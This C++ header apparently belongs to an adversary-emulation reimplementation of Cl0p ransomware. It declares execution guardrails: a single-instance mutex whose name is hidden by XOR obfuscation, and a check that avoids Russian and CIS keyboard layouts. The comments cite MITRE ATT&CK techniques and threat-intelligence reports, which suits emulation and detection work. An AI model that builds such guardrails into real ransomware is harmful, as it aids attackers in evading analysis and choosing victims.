#pragma once

#include <Windows.h>
#include <synchapi.h>
#include <format>

#include "logger.hpp"
#include "xor_obfuscation.hpp"


#define MUTEX_NAME XOR_LIT("Best-Fan-666")


namespace Guardrails {

    extern HANDLE h_mutex;

    /*
     * CheckCreateMutex():
     *      About:
     *          Checks for the presence of a global mutex to determine if there are
     *          multiple concurrent instances of this process on the local host. If the
     *          function returns true, the current process will keep a handle to the
     *          mutex, which must be closed prior to termination by calling
     *          Guardrails::ReleaseMutex();
     *      Result:
     *          Returns true if the mutex does not currently exist - in other words, if
     *          this process is the only Cl0p instance running on the local host.
     *          Returns false if the mutex already exists, or if mutex creation fails.
     *      MITRE ATT&CK Techniques:
     *          T1480: Execution Guardrails
     *      CTI:
     *          https://www.cybereason.com/blog/research/cybereason-vs.-clop-ransomware
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    bool CheckCreateMutex();

    /*
     * ReleaseMutex():
     *      About:
     *          Close the handle to the mutex stored in the current process.
     *      Result:
     *          Returns true if mutex handle closed successfully, otherwise false.
     */
    bool ReleaseMutex();

    /*
     * CheckLanguage()
     *      About:
     *         Checks local machine's keyboard layout and character set for Russian/CIS languages
     *      Result:
     *          Returns false if CIS language detected, true otherwise
     *      Returns:
     *          [bool]
     *      MITRE ATT&CK Techniques:
     *          T1614.001: System Location Discovery: System Language Discovery
     *          T1106: Native API
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    bool CheckLanguage();
}